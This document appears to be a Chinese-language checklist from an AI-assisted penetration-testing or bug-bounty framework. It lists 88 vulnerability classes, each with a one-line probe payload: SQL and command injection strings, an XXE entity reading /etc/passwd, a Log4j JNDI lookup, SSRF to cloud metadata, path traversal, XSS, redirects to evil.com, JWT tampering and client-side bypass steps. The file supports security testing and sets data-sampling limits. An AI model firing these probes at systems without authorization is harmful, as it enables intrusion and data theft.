# 覆盖审计（Coverage Audit）— 后置防漏机制

> **何时用**：自由攻击阶段结束后、写报告前。逐条过，漏了就补。
>
> **何时不用**：攻击过程中。不要带着这张表去打，那会变成走流程。
>
> **设计原则**：前松后紧。攻击阶段 AI 自由发挥不受约束；审计阶段确保系统性覆盖。
>
> **深挖优先铁律**：
> - 攻击阶段：**深度优先**。看到一个 Camunda 追 RCE 追到底，不要为了凑 88 项中途切面。
> - 收尾阶段：**广度兜底**。深度挖完后用 88 项防漏。
> - **顺序不可颠倒**。先广后深 = 每个面浅尝辄止，错过深洞。88 项是防漏网，不是攻击清单。
>
> 当前版本：v6.0-slim，共 **88 项**（#1–#55 Web/通用 + #56–#65 客户端与移动端 + #66–#72 信息收集 + #73–#88 客户端深度审计）。`src` 模式默认只强校验 core-10；`pentest` 模式必须全 88。

---

## 使用方法

复制到 `targets/<X>/audit.md`，打完后逐条标注：

```
✓     = 测了，无信号
✓★    = 测了，有发现（标注 F-XXX）
—     = 技术栈不适用（必须写原因）
✗     = 未测（必须补测，或写出不测的硬理由）
```

**规则：标 `—` 必须写一句话理由。标 `✗` 必须补测或确认 scope 不允许。不允许留空。**

---

## 采样证据四件套（money_ready 判定标准 — verified 后的证据完备度门槛）

verified 只是"洞真"，money_ready 才是"能投"。升 money_ready 前按四件套补齐影响论证（缺哪件 → lifecycle.yaml 标 `money_ready=no + missing`，自动进补证据队列）：

1. **数据量**：受影响记录规模/接口面（count / 统计接口 / 总量证据，不落库）
2. **采样 ≤5**：最多 5 条真实样本（`limit≤5` 或响应头截断；**禁翻页禁批量**）
3. **敏感度论证**：字段级——哪些字段对公众/竞对敏感（金额/手机号/客户 serial/内网地址）+ 业务语境下的实际影响
4. **反事实**：对照测试证明非公开设计（同族接口 401/403 对照 / 匿名应拒绝实际放行 / 参数变体返回不同数据）

红线重申：采样≠批量；≤5 条；仅 GET；样本入报告前脱敏；不留库。

---

## 审计表

### 注入类

| # | 漏洞类型 | 最小探针（1-2包定性） | 状态 |
|---|---|---|---|
| 1 | SQL 注入 — 字符串参数 | `' " \` 截断 + `OR 1=1` | |
| 2 | SQL 注入 — 数字参数 | `id=1 AND 1=2` vs `AND 1=1` 差异 | |
| 3 | SQL 注入 — 排序/分页 | `sort=name,(SELECT 1)` / `limit=1;WAITFOR DELAY '0:0:5'` | |
| 4 | SQL 注入 — Cookie/Header | `Cookie: lang=en'` / `X-Forwarded-For: 1'` | |
| 5 | NoSQL 注入 | `{"username":{"$ne":null}}` | |
| 6 | SSTI 模板注入 | `{{7*7}}${7*7}<%=7*7%>#{7*7}` 看是否返回 49 | |
| 7 | 命令注入 | `;id` `|id` `` `id` `` `$(id)` + `%0a id` | |
| 8 | LDAP 注入 | `*)(objectClass=*` 在登录/搜索参数 | |
| 9 | XXE | `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | |
| 10 | XPath 注入 | `' or '1'='1` 在 XML 查询上下文 | |
| 11 | CRLF 注入 | `%0d%0aInjected-Header:true` 在任意反射参数 | |
| 12 | Expression Language | `${7*7}` / `#{T(java.lang.Runtime).exec()}` (Java) | |

### 反序列化

| # | 漏洞类型 | 触发条件 | 状态 |
|---|---|---|---|
| 13 | Java 通用 | 找 Base64 解码后 `aced0005` / `rO0AB` 开头的输入 | |
| 14 | Shiro | `rememberMe` cookie → 替换为 gadget payload | |
| 15 | Fastjson | `{"@type":"java.net.Inet4Address","val":"dnslog"}` | |
| 16 | Log4j | `${jndi:ldap://dnslog/a}` 在全部输入点（Header优先） | |
| 17 | PHP unserialize | 找 `O:N:` 格式输入 / Phar 协议 | |
| 18 | .NET ViewState | 无 MAC 验证的 `__VIEWSTATE` → ysoserial.net | |
| 19 | .NET JSON.NET | 响应含 `$type` 字段 → TypeNameHandling 利用 | |
| 20 | Python Pickle/YAML | session cookie / 文件上传中的序列化数据 | |
| 21 | Node.js 原型污染 | `{"__proto__":{"isAdmin":true}}` 在 JSON body | |

### 认证与授权

| # | 漏洞类型 | 最小探针 | 状态 |
|---|---|---|---|
| 22 | 未授权访问 | 去掉 Token/Cookie 重放每个已知接口 | |
| 23 | IDOR 水平越权 | 替换 ID 为其他用户资源 ID | |
| 24 | 垂直越权 | 低权限 Token 调 /admin/ 路径 | |
| 25 | JWT alg:none | 改 header `{"alg":"none"}` + 去签名 | |
| 26 | JWT 弱密钥 | 常见密钥表签名验证 | |
| 27 | JWT kid 注入 | `"kid":"../../../dev/null"` + 空密钥 | |
| 28 | OAuth redirect_uri | `redirect_uri=https://evil.com` | |
| 29 | 路径绕过 | `/admin/` `/Admin` `/;/admin` `/%2fadmin` `/admin..;/` | |
| 30 | Header 绕过 | `X-Original-URL` `X-Forwarded-For: 127.0.0.1` | |
| 31 | 方法绕过 | GET 403 → POST/PUT/PATCH/OPTIONS 同路径 | |
| 32 | API 版本降级 | `/api/v2/admin` → `/api/v1/admin` | |

### 文件与网络

| # | 漏洞类型 | 最小探针 | 状态 |
|---|---|---|---|
| 33 | SSRF — 内网 | `url=http://127.0.0.1/` | |
| 34 | SSRF — 云元数据 | `url=http://169.254.169.254/latest/meta-data/` | |
| 35 | SSRF — 协议 | `url=file:///etc/passwd` / `gopher://` / `dict://` | |
| 36 | 任意文件读取 | `path=../../../etc/passwd` (4+ 层) | |
| 37 | 文件上传 — 扩展名 | `.php` `.phtml` `.php5` `.jsp` `.jspx` `.aspx` | |
| 38 | 文件上传 — 绕过 | 双扩展名 / %00 截断 / ::$DATA / .htaccess | |
| 39 | 文件上传 — 内容 | webshell 内容 + 合法 MIME | |
| 40 | XXE via 文件 | SVG / DOCX / XLSX 上传含 XXE payload | |
| 41 | 子域接管 | CNAME 指向已释放服务（dig + 访问验证） | |

### 逻辑与业务

| # | 漏洞类型 | 最小探针 | 状态 |
|---|---|---|---|
| 42 | Race Condition | 同一请求并发 20 次，看资源/状态异常 | |
| 43 | 支付金额篡改 | 改 price/amount 字段为 0.01 或负数 | |
| 44 | 状态机跳步 | 跳过步骤 1 直接调步骤 3 接口 | |
| 45 | Mass Assignment | 请求加 `role:admin` `isAdmin:true` `balance:999` | |
| 46 | 验证码绕过 | 不发验证码 / 重放旧验证码 / 爆破 4-6 位 | |
| 47 | 密码重置缺陷 | Host header 注入 / token 可预测 / 无绑定 | |

### 前端与协议

| # | 漏洞类型 | 最小探针 | 状态 |
|---|---|---|---|
| 48 | XSS 反射 | `<img/src=x onerror=alert(1)>` 在回显参数 | |
| 49 | XSS 存储 | 表单提交含 payload → 查看页触发 | |
| 50 | CORS 配置错误 | `Origin: https://evil.com` → 看 ACAO reflect + ACAC:true | |
| 51 | WebSocket 注入 | WS 消息体 SQL/命令注入 | |
| 52 | WebSocket 认证 | 跨域建 WS 连接（无 Origin 校验） | |
| 53 | HTTP 请求走私 | `CL` + `TE` 双头 | |
| 54 | 缓存投毒 | X-Forwarded-Host / X-Original-URL 改缓存 | |
| 55 | Host Header 注入 | 密码重置邮件中的链接域名可控 | |

### 客户端与移动端

| # | 漏洞类型 | 最小探针 | 状态 |
|---|---|---|---|
| 56 | 小程序源码泄露 | wxapkg 反编译 → grep API key / secret / 签名盐 | |
| 57 | 小程序越权 | openid/unionid 替换是否返回他人数据 | |
| 58 | SSL Pinning 绕过后 API 测试 | Frida bypass → 抓包 → 走 Web 全流程 | |
| 59 | Android 组件暴露 | exported=true 的 Activity/Provider 直接 `am start` 调用 | |
| 60 | 本地存储敏感数据 | SharedPreferences / Keychain / SQLite 明文凭据检查 | |
| 61 | 客户端硬编码密钥 | jadx / asar extract → grep API_KEY/SECRET/password | |
| 62 | Electron nodeIntegration RCE | webPreferences 检查 + 找 XSS 触发点 | |
| 63 | 深链接/URL Scheme 注入 | 构造恶意 scheme URL 测试参数注入/跳转劫持 | |
| 64 | 客户端更新劫持 | 自动更新是否 HTTP + 是否验证签名 | |
| 65 | Root/越狱检测绕过 | Frida hook 检测函数 → 绕过后测试特权功能 | |

### 信息收集（辅助，单独不报但必须过）

| # | 类型 | 探针 | 状态 |
|---|---|---|---|
| 66 | Actuator/Debug 路径 | `/actuator` `/actuator/env` `/actuator/heapdump` | |
| 67 | Swagger/API 文档 | `/swagger-ui.html` `/v2/api-docs` `/openapi.json` | |
| 68 | .git 泄露 | `/.git/HEAD` `/.git/config` | |
| 69 | .env / 配置文件 | `/.env` `/config.js` `/application.yml` | |
| 70 | GraphQL | `/graphql` + introspection query | |
| 71 | sourcemap | JS 文件尾 `sourceMappingURL` → 请求 `.map` | |
| 72 | 目录列表 | 常见路径返回 Index of / | |

### 客户端深度审计（P2 新增：iOS / macOS / Electron / Windows）

| # | 漏洞类型 | 最小探针 | 状态 |
|---|---|---|---|
| 73 | iOS URL Scheme 劫持/参数注入 | 构造 `target://action?param=evil` 测试注入与未授权调用 | |
| 74 | iOS ATS 例外域名 | `Info.plist` 中 `NSExceptionDomains` / `NSAllowsArbitraryLoads` | |
| 75 | iOS Keychain 敏感数据 | objection/keychain_dumper 查看凭据是否明文/弱加密 | |
| 76 | iOS 本地文件泄露 | 沙盒 `Documents/Library/Caches` 中 plist/SQLite/cache 明文凭据 | |
| 77 | iOS 二进制硬编码密钥 | `strings` / `rabin2 -zz` 提取后 grep API_KEY/SECRET/password/salt | |
| 78 | iOS 越狱检测绕过 | Frida hook 检测函数 → 绕过后测试支付/特权接口 | |
| 79 | macOS Entitlements / Sandbox | `codesign -d --entitlements` 审查过度授权与沙盒逃逸面 | |
| 80 | macOS Keychain / 本地存储 | `~/Library/Application Support` 与 Keychain 中凭据/Token | |
| 81 | Electron nodeIntegration | `asar extract` → grep `nodeIntegration: true` / `contextIsolation: false` | |
| 82 | Electron preload / IPC | preload 脚本中 `contextBridge` 滥用 / IPC 调用执行系统命令 | |
| 83 | Electron asar 源码泄露 | `client-recon.py --type electron` 提取后 grep secret/baseURL | |
| 84 | Electron 自动更新劫持 | update URL 是否 HTTP + 是否校验签名/哈希 | |
| 85 | Windows PE 字符串 / 配置泄露 | `strings` / 7z 解包后 grep 密钥/连接字符串/默认凭据 | |
| 86 | Windows DLL 劫持 | 安装目录/更新目录可写 → 替换 DLL 测试加载 | |
| 87 | 客户端 API 提取后 Web 测试 | AI 对 client-recon 提取的 API 走参数级反射 + Auth-SM | |
| 88 | 客户端签名绕过 / 重放 | `sign-extract.py` 识别 sign 函数 → 断点回填 → curl 重放 | |

---

## 技术栈速查（快速标 `—`）

以下组合可直接标"不适用"：

- PHP 相关（#17）：目标无 PHPSESSID / .php 路径 → `—`
- .NET 相关（#18 #19）：目标无 __VIEWSTATE / .aspx → `—`
- Python 相关（#20）：目标无 gunicorn / Flask / Django 特征 → `—`
- Node 相关（#21）：目标无 Express / Node 特征 → `—`
- Shiro（#14）：目标无 rememberMe cookie → `—`
- WebSocket（#51 #52）：目标无 WS 连接 → `—`
- GraphQL（#70）：探测 /graphql 返回 404 → `—`
- 子域接管（#41）：内网目标 / 无子域 → `—`
- 小程序相关（#56-57）：目标无小程序 → `—`
- Android 相关（#58-59-60）：目标无 APK / scope 不含移动端 → `—`
- iOS 相关（#60 #73-78）：无越狱设备且无静态 IPA 或无 iOS 资产 → `—`
- macOS 相关（#79-80）：无 macOS app / 无 `.app` bundle → `—`
- Electron（#62 #81-84）：目标非 Electron 应用 → `—`
- Windows 客户端（#85-86）：无 PE / 安装包 / 静态分析授权 → `—`
- 桌面客户端（#61-64）：目标无客户端 → `—`
- 签名绕过（#88）：请求无 sign / hmac / 加密参数 → `—`

**注意：标 `—` 的前提是你确认过技术栈，不是猜的。Java 目标也可能有内嵌 Node 微服务。**

---

## 补测优先级

审计发现 `✗` 后，按以下顺序补测（高 ROI 先）：

1. **反序列化/RCE 类**（Log4j / Fastjson / Shiro / 反序列化）— 一发入魂
2. **SSRF / 任意文件读**（云元数据 / 配置文件 / 内网）— 高赏金
3. **SSTI / 命令注入**（直接 RCE）
4. **SQL 注入遗漏点**（排序/Cookie/Header）
5. **认证绕过遗漏维度**（路径/Header/版本/方法）
6. **逻辑类**（Race/支付/Mass Assignment）
7. **文件上传**
8. **前端类**（XSS/CORS 等 — 通常低危）

---

## 与现有框架关系

- **reflexes.md**：攻击阶段发现指纹时按需 Read，用于深入
- **skills/\***：补测时如果需要详细方法，按需 Read 对应 skill
- **本文件**：只在攻击结束后用，作为覆盖性校验
- **findings.md**：审计发现新漏洞后正常写入

### 审计项 → skill 速查（补测时按需 Read）

| 审计项 # | 漏洞类型 | 对应 skill |
|---|---|---|
| #13-17 | 反序列化（Java/Shiro/Fastjson/Log4j/PHP） | `skills/injection/deserialization-rce.md` |
| #37-39 | 文件上传（扩展名/绕过/内容） | `skills/api-logic/file-upload.md` |
| #41 | 子域接管 | `skills/api-logic/subdomain-takeover.md` |
| #42-45 | 业务逻辑（竞态/支付/状态机/Mass Assignment） | `skills/api-logic/business-logic.md` |
| #53 | HTTP 请求走私 | `skills/api-logic/request-smuggling.md` |
| #54 | 缓存投毒 | `skills/injection/cache-poisoning.md` |
| WAF 拦截 | 所有 payload 被 WAF 拦 | `skills/fingerprint/waf-evasion.md` |
| 链式深挖 | 拿到 ≥1 verified 想扩战果 | `skills/chain-playbook.md` |

**铁律：本文件不参与攻击阶段的决策。攻击时忘了它的存在。**
